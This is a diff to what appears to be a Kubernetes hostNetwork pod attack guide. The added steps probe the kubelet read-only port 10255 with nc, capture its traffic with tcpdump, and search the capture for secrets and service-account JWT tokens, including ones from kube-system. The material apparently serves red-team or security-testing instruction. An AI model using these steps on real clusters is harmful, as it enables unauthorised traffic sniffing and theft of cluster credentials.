@@ -30,8 +30,31 @@ kubectl -n [namespace] exec -it pod-hostnetwork-only -- bash
 
 apt update && apt install tcpdump 
 
+# You now have a few options for next steps: 
+
+# See if the kubelet RO port is enabled and sniff the traffic
+# See if kubelet read only port (10255/tcp is open on the nodes IP or the docker host IP)
+
+nc -zv 10.0.0.162 10255
+Connection to 10.0.0.162 10255 port [tcp/*] succeeded!
+nc -zv 172.17.0.1 10255
+Connection to 172.17.0.1 10255 port [tcp/*] succeeded!
+
+# If the read only port is open, run tcpdump recording the output to a file for a few minutes
+
+#Warning: Sniffing on an interface with a lot of traffic can cause the interface to DROP traffic, which is not what you want in an production environment. I suggest picking one port at a time for your packet captures (e.g., 10255, 80, 8080, 3000 25, 23)
+
+#Warning: Always run tcpdump with the -n flag. This turns off name resolution, and if you don't, the name resolution will bring the capture, and potentially the host, to its knees. 
+
+tcpdump -ni [host or docker interface name] -s0 -w kubelet-ro.cap port 10255
+
+#Stop it, and read the file with tcpdump and use the -A flag to only show the printable characters
+
+tcpdump -ro kubelet-ro.cap -s0 -A
+
+#Cross your fingers and look for secrets.  If you are lucky, you might even get a jwt token. If you are really lucky, that token might be associated with a service account in kube-system.
 
 
-# Or investigate local services
+# Another option entirely: investigate local services
 curl https://localhost:1234/metrics
 ```
